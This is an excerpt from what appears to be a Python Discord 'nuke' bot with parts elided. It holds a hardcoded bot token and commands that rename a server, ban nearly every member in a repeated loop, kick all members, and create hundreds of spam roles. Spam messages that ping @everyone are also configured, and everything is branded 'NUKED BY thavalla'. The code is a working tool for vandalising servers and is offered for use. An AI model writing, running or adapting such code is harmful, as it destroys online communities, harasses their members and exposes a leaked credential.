...
token = 'MTEzMjY3MzQ1OTE0MzU3Nzc0MQ.GmrtWv.zrSJvCYlr2GeE6WwC_800ud2icwVacraY4zHFY'
channel_names = ['Nuked by thavalla']
message_spam = ['@everyone NUKED BY THAVALA  ']
webhook_names = ['NUKED BY THAVALLA' ]
###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "TAVALLA ALL IN ALL BOT" ))#change this if you want
  print(f''' 

ɿɘqqɒM

M̶̫̜̔̑͊å̵̡͖͉̱͓̜̅̉̏͐̿͗͛̕͜p̸̨̱̝̟̟͂͗̄̀̒͐͑͐̎ṕ̶̰̭̐e̶̡̛̮͇͆͐͗͂͋̈́̒̆r̸̢̡̞̮͍̥͕̜̜̽͂
...
async def hi(ctx, amount=50):
  ...
  await ctx.guild.edit(name="THAVALLA")
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "NUKED BY thavalla")
...
async def kickall(ctx):
  ...
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NUKED BY thavalla")
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKED BY thavalla")
